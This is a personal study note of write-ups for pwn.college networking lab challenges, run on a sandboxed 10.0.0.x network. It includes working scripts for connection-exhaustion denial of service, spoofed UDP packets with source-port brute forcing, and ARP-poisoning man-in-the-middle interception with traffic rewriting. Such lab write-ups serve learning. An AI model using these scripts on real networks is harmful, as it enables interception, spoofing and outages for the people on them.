[[Intro to Cybersecurity (Hub)]]

Various techniques to intercept and manipulate network communication. Connecting to remote hosts, performing man-in-the-middle, etc.

Basic networking ([[Networking (Main Hub)]])

# TL;DR
pwn.college has a bunch of challenges ranging from connecting to a remote host (using [[netcat|nc]]), sending a message to a remote host (sending it after connecting with nc), shutting down a connection after connecting to it, listening for a connection, scanning hosts, monitoring traffic on your host, [[Denial of Service|DoS]] attacks

Tools potentially used:
Connect: [[netcat]]
Send: [[netcat]]
Shutdown: [[netcat]] (with -N flag)
Listen: [[netcat]] (with -l flag)
Scan 1: [[ping (command)]] -> with for loop
Scan 2: [[nmap]]
Monitoring 1: [[Wireshark]]
# pwn.college Challenges
Challenges: run /challenge/run -> sets up network environment. Use that env to do the challenges.
#### Connect
First challenge is to connect to 10.0.0.2 on port 31337 from our env (10.0.0.1). Connection gives back flag. Can just use [[netcat|nc]]
#### Send
From the host at 10.0.0.1, connect to 10.0.0.2:31337 and send "Hello, World!". Once again we can just use nc, write the string and press Enter. nc waits for Enter to be sent because it otherwise just buffers the input.
#### Shutdown
Connect to 10.0.0.2:31337 and shutdown the connection.
Sometimes receiving end will wait until sender sends all data before it replies back. What if the client needs to send a ton of data over a long period before the receiving end sends it back? The client might not even know how much data it needs to send. How can we handle this?
Have the client send a single packet saying END, but packets are tricky and may be merged together, or split. Or what if the data itself contains "END"
The flag -N on netcat allows EOF to close the connection.
#### Listen
Once a connection is established, the connection is bidirectional (both sides can send and receive). However, one side must listen for incoming connections and the other side must connect to that listener.
From 10.0.0.1 listen on port 31337.
#### Scan 1
challenge/run drops us into a shell on a host with network access with IP 10.0.0.1. We need to connect to an unknown remote host on a 10.0.0.0/24 subnet (8 bit host part) on port 31337.
There are 2^8 - 2 hosts so 254 hosts (1st is network address, last is broadcast. We can try them all. We can use [[ping (command)]] and if we get an answer we've found the host. We can then use nc. (The host was .136)
```bash
for i in $(seq 2 254); do timeout 2 ping "10.0.0.$i"; done
```
#### Scan 2
Similar to Scan 1 but this time the subnet is 10.0.0.0/16 -> 16 bit host part -> 65k possible hosts. Pinging them would take 1 hour if we somehow pinged 10 hosts a second.
Instead we can use [[nmap]] to make it faster.
10.0.0.0/30 will take about 15 seconds to find our host.
nmap -T5 --min-rate 3000 -n -v 10.0.0.0/16 -> fastest timing, 3000 packets per second minimum, no DNS resolution.
#### Monitor 1
Now we have to monitor traffic from a remote host. Our host is receiving traffic on port 31337
We can use Wireshark to do this. I found the largest packet, there was a Data field in the inspector. Seems to be in hexadecimal. Right click, show packet bytes gives us the characters (flag)
#### Monitor 2
Monitor slow traffic from a remote host. Our host is receiving on 31337.
Now the chars are being sent 1 char by 1 char on each TCP segment.
We can go to Analyze -> Follow -> TCP Stream and we get the entire flag.
Aka sniffing.
#### Sniffing Cookies
We have to steal the admin's cookie.
We can use various HTTP tools, Wireshark and whatever else we might need in the background.
I used Wireshark to sniff the cookie.
Then I figured I can use nc to connect to 10.0.0.2:80, and send a GET response to /flag with the Cookie set. Got the flag
#### Network Configuration
This time we have to configure our network interface.
Remote host at 10.0.0.2 is trying to communicate with 10.0.0.3 on port 31337.
Network interfaces come in many types: loopback, ethernet, wireless, virtual, etc.
Can use the [[ip command]] to set this up.
ip addr add 10.0.0.3/24 dev eth0 -> adds an IP to dev/interface eth0
ip link set eth0 up -> sets its state to up
Then open nc listener. nc -l 10.0.0.3 31337. The flag is sent
#### Firewall 1
Our host at 10.0.0.1 is receiving traffic on port 31337. We need to block that traffic by setting up a [[Firewall]].
A common tool for configuring rules is [[iptables command]]
iptables -A INPUT -s 10.0.0.2/24 -j DROP
Flag was given after this.
#### Firewall 2
This time they want us to block only 10.0.0.3
iptables -A INPUT -s 10.0.0.3 -j DROP
#### Firewall 3
This time they have blocked outbound traffic to port 31337, so we need to allow it first.
Then connect to 10.0.0.2 31337.
Simplest way is to delete it
Check the table: iptables -L
iptables -D OUTPUT -p tcp --dport 31337 -j DROP
Now connect. Get the flag.
#### Denial of Service 1
The client at 10.0.0.3 is communicating with a server at 10.0.0.2 on port 31337. Deny this service.
Perform a [[Denial of Service]] attack. Connection queue exhaust
Idk if this is the right way to go about it but I fork bombed my own host with running nc 10.0.0.2 31337 & $0 as a bash script (runs nc in the bg then reruns this script). This solution gave me the flag but it does nuke our host, so I did a while true loop instead and terminated it when they gave us the flag.
Post-solution thoughts: Actually the correct solution here is just connecting once, we don't even need a while loop. Basically, one server with 0 concurrency, if we connect, no one else can connect.
#### Denial of Service 2
Same as DoS 1 but the server forks a new process for each client connection.
Now we need the while loop to create a bunch of connections, works as eventually too many processes are made? Idk, it gave us the flag. Eventually there's process exhaustion or memory or FD or something else.
#### Denial of Service 3
Same as DoS 2 but this time on top of forking a new process per connection, sessions get limited to 1 second.
Basically we have to find a way to run more connections than are killed within that 1 second?
Not only that, but according to the challenge/run code, we need the 10.0.0.3 connection to timeout, and that takes 60 seconds.
Previous challenge basically got solved by this: "as long as you exhaust all children so that 10.0.0.3 can't connect, you get the flag" - so instant bursts of nc connections worked.
This challenge needs continuous connections, so that we create new nc connections and not give any chance for 10.0.0.3 to connect for the duration of 60s. So if we create a new nc connection just on the verge of the last one dying (time limit 1s), eventually we will never give 10.0.0.3 time to connect?
We do this in a python script with multithreading, to make sure we don't kill our own host by exhausting forks.
```python
import socket
import threading

def connect():
	while True:
		try:
			s = socket.socket()
			s.connect(("10.0.0.2", 31337))
		except:
			pass
			
while True:
	threading.Thread(target=connect).start()
```
#### Ethernet
Now we have to manually send an Ethernet packet (frame)
Ether type=0xFFFF.
Typically the OS handles and controls sockets. However, we can create a Layer 2 socket, called a [[raw socket]].
We can use [[python socket]] but they suggest we use [[Scapy]]
Scapy:
```python
packet = Ether(type=0xFFFF) / IP(dst="10.0.0.2")
res = srp1(packet)
```
#### IP
Manually send an IP packet. IP proto=0xFF, sent to 10.0.0.2
```python
packet = IP(proto=0xFF, dst="10.0.0.2")
res = sr1(packet)
```
#### TCP
Manually send a TCP packet. sport=31337, dport=31337, seq=31337, ack=31337, flags=APRSF. Sent to 10.0.0.2
```python
packet = IP(dst="10.0.0.2") / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF")
res = sr1(packet)
```
#### TCP Handshake
Manually perform a TCP [[three-way handshake]]. Occurs at 10.0.0.2
Initial packet has TCP sport=31337, dport=31337, seq=31337. Flags is S (Synchronise) The return we get is a SYN-ACK, so the next packet we send needs to be at seq = SYN_ACK.ack, and our ack number is SYN_ACK.seq+1, with the flag A (Acknowledgment)
```python
ip = IP(src="10.0.0.1", dst="10.0.0.2")
SYN = ip / TCP(sport=31338, dport=31337, seq=31337, flags="S")
SYN_ACK = sr1(SYN)
ACK = ip / TCP(sport=31337, dport=31337, seq=SYN_ACK.ack, ack=SYN_ACK.seq+1, flags="A")
```
#### UDP
This time we will made a UDP connection from our host 10.0.0.1 to host 10.0.0.2 on port 31337 and we will send "Hello, World!\n". They suggest Python, but can be done with netcat as well.
More info: [[UDP Socket]]
nc -u 10.0.0.2 31337 -> write Hello, World!
Python:
```python
import socket
s = socket.socket(AF_INET, SOCK_DGRAM)
s.sendto(b"Hello, World!\n", ("10.0.0.2", 31337))
res = s.recvfrom(1024)
```
#### UDP 2
In addition to a destination port, both TCP and UDP can set their source port. Done on the [[bind syscall]] on the socket, exactly how a listening server does it. Needs to be set before sending data, otherwise Linux chooses a random port. We need to send it through src port 31338.
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("10.0.0.1", 31338))
s.sendto(b"Hello, World!\n", ("10.0.0.2", 31337))
data, addr = s.recvfrom(1024)
print(data)
```
#### UDP Spoofing
Info: [[UDP Spoofing]]
One side can confuse a non-trusted connection for a trusted connection, and print the flag. We need to make the server that sends the flag see that we are a trusted connection, falsifying our IP address.
According to /challenge/run, server is 10.0.0.3 (port 31337), trusted client is 10.0.0.2 (port 31338). Client is expecting the message "FLAG" from the server, and then flag is printed on stdout.
We need to first add the address of the server to our interface, otherwise we can't bind to it.
- ip addr add 10.0.0.3/24 dev eth0
Now we can bind our socket to it and send the message.
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("10.0.0.3", 31337))
s.sendto(b"FLAG", ("10.0.0.2", 31338))
```
After solving this, I have seen that we can skip the adding of the 2nd address and binding a socket to it by using [[Scapy]] to directly send a packet from that IP.
So something like:
```python
from scapy.all import *
packet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / b"FLAG" 
send(packet)
```
#### UDP Spoofing 2
This time they want us to redirect the flag to another server.
We need to create a UDP server that will receive the flag, can be Python or netcat, or even just sniffing with Wireshark.
Server host: 10.0.0.3:31337
Trusted client host: 10.0.0.2:31338. -> if rcv msg from 10.0.0.3 includes msg FLAG, sends flag.encode() to some flag_host and flag_port that are specified in the message.strip().split(b":") (\_, flag_host, flag_port = to that)
So we need to create a server, run it on flag_host:flag_port (say 10.0.0.1:31337 using nc -ul on a new terminal window, or tmux, or screen)
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("10.0.0.3", 31337))
s.sendto(b"FLAG:10.0.0.1:31337", ("10.0.0.2", 31338))
```
Or using Scapy:
```python
from scapy.all import *
packet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / b"FLAG:10.0.0.1:31337" 
send(packet)
```
#### UDP Spoofing 3
In the previous example we knew the source port that the client was using and so we could forge the server's response. This was actually the cause of a vulnerability in the [[Domain Name System]] ([Read more here](https://web.archive.org/web/20250417171505/https://citeseerx.ist.psu.edu/document?repid=rep1&type=pdf&doi=0c1e863b6698808b724def8793d7cba023494808)). The attackers could forge responses from DNS servers and redirect victims to IP addresses of their choice.
The fix was to randomise the source port that DNS requests go out from. They've done that here. Can we force the response?
Source port -> set once per socket, on bind or on sendto. What can we do?
Basically we can brute force (send to all ports on 10.0.0.2). This time the host 10.0.0.2 only checks the source port, so we can send packets from our own host 10.0.0.1 on port 31337, while listening on port 31338 with netcat
To make it quicker, we can do [[Python threading]].
```python
from scapy.all import *

server_ip = "10.0.0.1"
client_ip = "10.0.0.2"
server_port = 31337

def send_packet_range(start, end):
    for client_port in range(start, end):
        packet = IP(src=server_ip, dst=client_ip) / UDP(sport=server_port, dport=client_port) / b"FLAG:10.0.0.1:31338"
        send(packet)
        print(f"[+] Sent packet {packet}")

threads = []

ranges = [
        (1024, 16000),
        (16000, 32000),
        (32000, 48000),
        (48000, 65536),
]

for start, end in ranges:
    t = threading.Thread(target=send_packet_range, args=(start, end))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
```
Might need to run this a few times, as packets can be lost in UDP.
### UDP Spoofing 4
This time the challenge checks that the response came from the right server. UDP is easier to forge than TCP ([[TCP spoofing]]). We can use Scapy.
Host 10.0.0.2 checks if the message received is from 10.0.0.3:31337 (previously it only checked the port). Otherwise it's the same as the previous challenge, we just have to change the src IP on the packets.
#### ARP
Now they want us to manually send an [[Address Resolution Protocol]]. Packet informs the remote host that the IP 10.0.0.42 can be found at Ethernet address 42:42:42:42:42:42.
Sent to 10.0.0.2.
```python
from scapy.all import *
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc="10.0.0.42", pdst="10.0.0.2", hwsrc="42:42:42:42:42:42")
srp1(pkt)
```
op = response = IS_AT; psrc = IP source, pdst = IP dest, hwsrc = MAC source
#### Intercept
Now they want us to intercept traffic from a remote host 10.0.0.2 is communicating (sending flag) to remote host 10.0.0.3 on port 31337. The client code uses socket connect to IP:port, so the communication is TCP.
I tried Wireshark and Scapy's sniff but we're only getting ICMPv6 messages, no actual traffic.
We can spoof IP:
- ip addr add 10.0.0.3 dev eth0
Then use ping from that IP to ping to 10.0.0.2 (invokes ARP first so that ICMP can be sent)
ping -I 10.0.0.3 10.0.0.2
nc -l 10.0.0.3 31337
OR we can send the ARP ourselves through Scapy
```python
from scapy.all import *
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc="10.0.0.3", pdst="10.0.0.2", hwsrc="aa:4c:06:ae:49:1e") # (or whatever the hwsrc might be)
srp1(pkt)
```
#### Man-in-the-Middle
##### Challenge code:
```python
#!/usr/bin/exec-suid --real -- /usr/local/bin/python -I

import multiprocessing
import os
import socket
import time

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class AuthenticatedClientHost(Host):
    def entrypoint(self):
        while True:
            try:
                client_socket = socket.socket()
                client_socket.connect(("10.0.0.3", 31337))

                assert client_socket.recv(1024) == b"secret: "
                secret = bytes(server_host.secret)  # Get the secret out-of-band
                time.sleep(1)
                client_socket.sendall(secret.hex().encode())

                assert client_socket.recv(1024) == b"command: "
                time.sleep(1)
                client_socket.sendall(b"echo")
                time.sleep(1)
                client_socket.sendall(b"Hello, World!")
                assert client_socket.recv(1024) == b"Hello, World!"

                client_socket.close()
                time.sleep(1)

            except (OSError, ConnectionError, TimeoutError, AssertionError):
                continue

class AuthenticatedServerHost(Host):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.secret = multiprocessing.Array("B", 32)

    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()

                self.secret[:] = os.urandom(32)
                time.sleep(1)
                connection.sendall(b"secret: ")
                secret = bytes.fromhex(connection.recv(1024).decode())
                if secret != bytes(self.secret):
                    connection.close()
                    continue

                time.sleep(1)
                connection.sendall(b"command: ")
                command = connection.recv(1024).decode().strip()

                if command == "echo":
                    data = connection.recv(1024)
                    time.sleep(1)
                    connection.sendall(data)
                elif command == "flag":
                    time.sleep(1)
                    connection.sendall(flag.encode())

                connection.close()
            except ConnectionError:
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
client_host = AuthenticatedClientHost("ip-10-0-0-2")
server_host = AuthenticatedServerHost("ip-10-0-0-3")
network = Network(hosts={user_host: "10.0.0.1",
                         client_host: "10.0.0.2",
                         server_host: "10.0.0.3"},
                  subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```
##### Solution
Now we perform a [[man-in-the-middle]] traffic from a remote host. 10.0.0.2 is communicating with 10.0.0.3 on port 31337.
Code seems to be more complex now.
10.0.0.3 is a server listening TCP on 31337. It creates a secret (urandom32). It also receives a secret. If the secret equals local secret, the connection continues. The server then sends a "command". If the client receives "command" it can then send a command -> echo (echos back data), flag -> sends flag encoded. If the secret inputted is wrong, the connection closes.
Client gets the secret out-of-band and sends it, so we don't need to grab that.
So my mental model is this: Make 10.0.0.2 client send "flag" as message to 10.0.0.3. Or more precisely, trick 10.0.0.3 into thinking they're talking to 10.0.0.2 but in reality we are 10.0.0.2 (on 10.0.0.1).
So if we ARP Request to get 10.0.0.2's hwsrc, and then ARP Reply to 10.0.0.3 with psrc 10.0.0.1 hwsrc 10.0.0.2's MAC, we can then send packets to 10.0.0.3
No.
We need to poison both of the hosts' ARP tables.
So we need to make 10.0.0.2 think 10.0.0.3 has 10.0.0.1's MAC
And we need to make 10.0.0.3 think that 10.0.0.2 has 10.0.0.1's MAC.
Another issue is that we are the middle man and packet forwarding is disabled, so we have to write a script that will forward the packets to the correct destination. Since both get sent to us now, they get stuck (client doesn't actually reach server, and vice versa)

ARP Poisoning script:
```python
import time
from scapy.all import *

# IP addresses
client_ip = "10.0.0.2"
server_ip = "10.0.0.3"

# MAC Addresses
local_mac = get_if_hwaddr("eth0")
client_mac = getmacbyip("10.0.0.2")
server_mac = getmacbyip("10.0.0.3")

# Packet Assemblies
eth = Ether(dst="ff:ff:ff:ff:ff:ff")
arp_server_poison = ARP(op=2, psrc=client_ip, hwsrc=local_mac, pdst=server_ip,  hwdst=server_mac)
arp_client_poison = ARP(op=2, psrc=server_ip, hwsrc=local_mac, pdst=client_ip, hwdst=client_mac)

#Send ARP poisoning every 3 seconds
while True:
	sendp(eth / arp_server_poison)
	sendp(eth / arp_client_poison)
	time.sleep(3)
```

Sniffer:
```python
from scapy.all import *

# MAC Addresses
local_mac = get_if_hwaddr("eth0")
client_mac = getmacbyip("10.0.0.2")
server_mac = getmacbyip("10.0.0.3")

# Sniffer and Relayer
# Since both hosts' packets come to us, they never reach the destination. IP Forwarding is OFF (0).
def sniffer_relay(pkt: Packet):
    pkt.show()
	
    # Relayer logic
    new_packet = pkt.copy()
    
    # Relay to the correct MAC address
    if (pkt["TCP"].sport == 31337):
        new_packet[Ether].dst=client_mac
    else:
        new_packet[Ether].dst=server_mac

	# Actual attack. Change echo command to flag.
    if (pkt.haslayer(Raw) and pkt[Raw].load == b"echo"):
        new_packet[Raw].load = b"flag"
        del new_packet[IP].chksum
        del new_packet[TCP].chksum

	# Send the new packet; automatically recalculates chksums since they are missing
    sendp(new_packet, verbose=0)

sniff(iface="eth0", filter="tcp", prn=sniffer_relay)
```
Or as one code:
```python
from scapy.all import *

# IP Addresses
client_ip = "10.0.0.2"
server_ip = "10.0.0.3"

# MAC Addresses
local_mac = get_if_hwaddr("eth0")
client_mac = getmacbyip(client_ip)
server_mac = getmacbyip(server_ip)

# Set up ARP poisoning
broadcast_eth = Ether(dst="ff:ff:ff:ff:ff:ff")
arp_server_poison = ARP(op=2, psrc=client_ip, hwsrc=local_mac, pdst=server_ip, hwdst=server_mac)
arp_client_poison = ARP(op=2, psrc=server_ip, hwsrc=local_mac, pdst=client_ip, hwdst=client_mac)

#Send ARP poisoning
sendp(broadcast_eth / arp_server_poison)
sendp(broadcast_eth / arp_client_poison)

# Sniff -> check b"command: " -> send fake packet
# Or check if legitimate client packet b"echo", change to b"flag"
# Otherwise just forward real packet to destination.
def sniffer_relay(pkt: Packet):
    pkt.show() # Optional

    # Relay logic
    new_packet = pkt.copy()

    if (pkt["TCP"].sport == 31337):
        new_packet[Ether].dst=client_mac
    else:
        new_packet[Ether].dst=server_mac

    if (pkt.haslayer(Raw) and pkt[Raw].load == b"echo"):
        new_packet[Raw].load = b"flag"
		del new_packet[IP].len
        del new_packet[IP].chksum
        del new_packet[TCP].chksum

    sendp(new_packet, verbose=0)

sniff(iface="eth0", filter="tcp", prn=sniffer_relay)
```